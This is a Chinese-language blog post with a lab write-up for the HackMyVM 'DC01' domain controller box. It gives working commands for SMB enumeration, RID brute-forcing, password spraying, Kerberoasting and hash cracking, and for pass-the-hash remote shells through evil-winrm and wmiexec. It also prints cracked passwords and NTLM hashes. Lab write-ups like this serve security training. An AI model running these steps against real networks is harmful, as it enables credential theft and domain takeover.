@@ -1,0 +1,231 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm_dc01 | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="操作系统：Windows（域控服务器，主机名：DC01）开放端口和服务：53 - DNS88 - Kerberos（认证服务）135 - RPC139&#x2F;445 - SMB（文件共享）389&#x2F;3268 - LDAP（AD 目录服务）464 - Kerberos密码修改593 - RPC over HTTP636&#x2F;3269 - LDAPS（加密LDAP）其他信息：域名是：SOUPEDECODE.L">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackmyvm_dc01">
+<meta property="og:url" content="http://example.com/2025/05/29/hackmyvm-dc01/index.html">
+<meta property="og:site_name" content="myift">
+<meta property="og:description" content="操作系统：Windows（域控服务器，主机名：DC01）开放端口和服务：53 - DNS88 - Kerberos（认证服务）135 - RPC139&#x2F;445 - SMB（文件共享）389&#x2F;3268 - LDAP（AD 目录服务）464 - Kerberos密码修改593 - RPC over HTTP636&#x2F;3269 - LDAPS（加密LDAP）其他信息：域名是：SOUPEDECODE.L">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/png.png">
+<meta property="article:published_time" content="2025-05-29T13:28:45.000Z">
+<meta property="article:modified_time" content="2025-05-29T14:11:42.724Z">
+<meta property="article:author" content="dgh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "hackmyvm_dc01",
+  "url": "http://example.com/2025/05/29/hackmyvm-dc01/",
+  "image": "http://example.com/image/png.png",
+  "datePublished": "2025-05-29T13:28:45.000Z",
+  "dateModified": "2025-05-29T14:11:42.724Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "dgh",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/05/29/hackmyvm-dc01/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hackmyvm_dc01',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">hackmyvm_dc01</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm_dc01</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-29T13:28:45.000Z" title="发表于 2025-05-29 21:28:45">2025-05-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-29T14:11:42.724Z" title="更新于 2025-05-29 22:11:42">2025-05-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/../imgs/$%7Bfiilename%7D/image-20250428213034133.png" alt="image-20250428213034133"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250427211654125.png" alt="image-20250427211654125"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统：Windows（域控服务器，主机名：DC01）</span><br><span class="line"></span><br><span class="line">开放端口和服务：</span><br><span class="line"></span><br><span class="line">53 - DNS</span><br><span class="line"></span><br><span class="line">88 - Kerberos（认证服务）</span><br><span class="line"></span><br><span class="line">135 - RPC</span><br><span class="line"></span><br><span class="line">139/445 - SMB（文件共享）</span><br><span class="line"></span><br><span class="line">389/3268 - LDAP（AD 目录服务）</span><br><span class="line"></span><br><span class="line">464 - Kerberos密码修改</span><br><span class="line"></span><br><span class="line">593 - RPC over HTTP</span><br><span class="line"></span><br><span class="line">636/3269 - LDAPS（加密LDAP）</span><br><span class="line"></span><br><span class="line">其他信息：</span><br><span class="line"></span><br><span class="line">域名是：SOUPEDECODE.LOCAL</span><br><span class="line"></span><br><span class="line">SMB要求签名（意味着直接pass-the-hash/relay SMB攻击受限）</span><br><span class="line"></span><br><span class="line">时间存在时钟偏移（+15小时）</span><br></pre></td></tr></table></figure>
+
+<p>先给域名加入hosts文件</p>
+<p>然后收集smb信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.56.128 -u &#x27;&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">crackmapexec smb 192.168.56.128 -u &#x27;anonymous&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">crackmapexec smb 192.168.56.128 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">crackmapexec smb 192.168.56.128 -u &#x27;banyio&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">smbmap -H 192.168.56.128 -u guest</span><br><span class="line">smbmap -H 192.168.56.128 -u anonymous</span><br><span class="line">smbmap -H 192.168.56.128 -u banyio</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250428215907925.png" alt="image-20250428215907925"></p>
+<p>可以利用guest对IPC$的可读权限进行域用户和域用户名的枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U &quot;&quot; 192.168.56.128</span><br><span class="line">enumdomusers</span><br><span class="line">enumdomgroups</span><br><span class="line">querydominfo</span><br><span class="line">lsaquery</span><br><span class="line">失败</span><br><span class="line"> impacket-lookupsid banyio@192.168.56.128</span><br><span class="line"> nxc smb 192.168.56.128 -u guest -p &quot;&quot; --rid-brute</span><br><span class="line">枚举成功</span><br><span class="line">两者的区别</span><br><span class="line">rpcclient enumdomusers</span><br><span class="line">→ 相当于“老板，能给我公司所有员工名单吗？”</span><br><span class="line">→ 如果你只是个门卫（guest用户），老板肯定不答应你。</span><br><span class="line">lookupsid.py</span><br><span class="line">→ 相当于“自己偷偷查，每个员工ID是不是在这家公司”，一个个试出来的。</span><br><span class="line">→ 慢，但是只要门还开着（IPC$连得上），你就能一点点摸出来。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250428224318418.png" alt="image-20250428224318418"></p>
+<p>提取出用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-lookupsid banyio@192.168.56.128 &gt; name.txt 或nxc smb 192.168.0.202 -u guest -p &quot;&quot; --rid-brute | tee nxc.rid.txt</span><br><span class="line"></span><br><span class="line">cat name.txt | grep SidTypeUser | cut -d &#x27;\&#x27; -f2 | cut -d &#x27; &#x27; -f1 &gt; user.txt或</span><br><span class="line">garffff@garffff:~/hackmyvm/dc01$ cat nxc.rid.txt | grep SidTypeUser | awk &#x27;&#123;print $6&#125;&#x27; | cut -d &quot;\\&quot; -f 2 &gt; users.txt</span><br><span class="line">nxc smb $IP -u websvc -p &#x27;jordan23&#x27; --rid-brute | grep SidTypeUser |cut -d: -f2 |cut -d \\ -f2 |cut -d &#x27; &#x27; -f1 &gt; names.txt</span><br></pre></td></tr></table></figure>
+
+<p>进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc smb 192.168.56.128 -u user.txt -p user.txt</span><br><span class="line">nxc smb 192.168.56.128 -u user.txt -p user.txt --no-brute这样的是行行对应爆破</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429201612352.png" alt="image-20250429201612352"></p>
+<p>爆出用户名密码</p>
+<p>登录并找到flag</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429202252541.png" alt="image-20250429202252541"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429202304806.png" alt="image-20250429202304806"></p>
+<p>接下来就是提权找另一个用户了</p>
+<p>下面是就是Kerberoasting攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.56.128 -request</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429211918881.png" alt="image-20250429211918881"></p>
+<p>再次查看端口发现是因为时间不同步造成的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntpdate -q SOUPEDECODE.LOCAL</span><br><span class="line"></span><br><span class="line">faketime &#x27;53998 seconds&#x27; impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.56.128 -request</span><br></pre></td></tr></table></figure>
+
+<p>这样就解决了时间不同步问题</p>
+<p>接下来就是爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">faketime &#x27;53998 seconds&#x27; impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 192.168.56.128 -request -outputfile hash.txt</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">这个看不出密码是哪个用户的</span><br><span class="line">所以可以用</span><br><span class="line">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429214820003.png" alt="image-20250429214820003"></p>
+<p>得道密码Password123!!用户为file_svc</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429220227013.png" alt="image-20250429220227013"></p>
+<p>多了一些权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.56.128/backup -U file_svc</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429220426033.png" alt="image-20250429220426033"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/dc1]</span><br><span class="line">└─# cat backup_extract.txt </span><br><span class="line">WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::</span><br><span class="line">DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::</span><br><span class="line">CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::</span><br><span class="line">FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::</span><br><span class="line">MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::</span><br><span class="line">BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::</span><br><span class="line">ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::</span><br><span class="line">PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::</span><br><span class="line">ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::</span><br><span class="line">MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::</span><br></pre></td></tr></table></figure>
+
+<p>接下来将用户名和密码分开</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat backup_extract.txt | cut -d &quot;:&quot; -f 1 &gt; new_users.txt</span><br><span class="line">cat backup_extract.txt | cut -d &#x27;:&#x27; -f4 &gt; hashes.txt</span><br><span class="line">爆破</span><br><span class="line">nxc smb 192.168.56.128 -u new_users.txt -H hashes.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429221624556.png" alt="image-20250429221624556"></p>
+<p>得到对应的用户和密码</p>
+<p>SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.0.2.31 -u &#x27;FileServer$&#x27; -H e41da7e79a4c76dbd9cf79d1cb325559(用的WinRM协议)</span><br><span class="line">或</span><br><span class="line">wmiexec.py &#x27;SOUPEDECODE.LOCAL/FileServer$@192.168.56.128&#x27; -hashes :e41da7e79a4c76dbd9cf79d1cb325559(用的WMI协议)</span><br></pre></td></tr></table></figure>
+
+<p>远程连接获得shell</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429222950754.png" alt="image-20250429222950754"></p>
+<p>rootflag</p>
+<p>在admin桌面</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250429223332116.png" alt="image-20250429223332116"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/29/hackmyvm-dc01/">http://example.com/2025/05/29/hackmyvm-dc01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/29/hackmyvm-always/" title="hackmyvm_always"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hackmyvm_always</div></div><div class="info-2"><div class="info-item-1">寻找靶机+初步扫描  ┌──(root㉿kali)-[~]└─# nmap -sV -sC 192.168.106.135                                                                            Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-25 09:03 EDTNmap scan report for 192.168.106.135Host is up (0.00037s latency).Not shown: 987 closed tcp ports (reset)PORT      STATE SERVICE      VERSION21/tcp    open  ftp          Microsoft ftpd| ftp-syst: |_  SYST: Windows_NT22/tcp    open  ssh          OpenSSH for_Windows_9.5 (protocol 2.0)135/tcp  ...</div></div></div></a><a class="pagination-related" href="/2025/05/29/hackmyvm-dc04/" title="hackmyvm_dc04"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">hackmyvm_dc04</div></div><div class="info-2"><div class="info-item-1"> 端口扫描 给扫到的域名加入hosts文件  SMB (445)Kerberos (88)LDAP (389, 3268)RPC (135, 593)DNS (53)暂时都利用失败  80端口服务目录扫描  找到新的域名加入host文件  http://heartbeat.soupedecode.local/login.php  对登陆页面进行测试 爆破出密码: admin&#x2F;nimda  使用responder进行欺骗尝试拿到hash responder -I eth1 -Pdv  下面是详细的解释: Web 应用的功能： 登录后的 Web 页面 (http://heartbeat.soupedecode.local:8080/login.php 成功登录后跳转的页面) 提供了一个 &quot;Network Share Connect&quot; 功能。这意味着这个页面背后的服务器端代码（很可能是 PHP）会接收你输入的 IP 地址，并尝试从目标服务器 (192.168.56.126) 发起一个网络共享连接到你提供的 IP 地址。输入攻击机 IP： 当你输入...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-todd/" title="hackmyvm_todd">hackmyvm_todd</a><time datetime="2025-05-29T13:29:17.000Z" title="发表于 2025-05-29 21:29:17">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-Matrioshka/" title="hackmyvm_Matrioshka">hackmyvm_Matrioshka</a><time datetime="2025-05-29T13:29:07.000Z" title="发表于 2025-05-29 21:29:07">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-dc04/" title="hackmyvm_dc04">hackmyvm_dc04</a><time datetime="2025-05-29T13:28:50.000Z" title="发表于 2025-05-29 21:28:50">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-dc01/" title="hackmyvm_dc01">hackmyvm_dc01</a><time datetime="2025-05-29T13:28:45.000Z" title="发表于 2025-05-29 21:28:45">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-always/" title="hackmyvm_always">hackmyvm_always</a><time datetime="2025-05-29T13:28:35.000Z" title="发表于 2025-05-29 21:28:35">2025-05-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
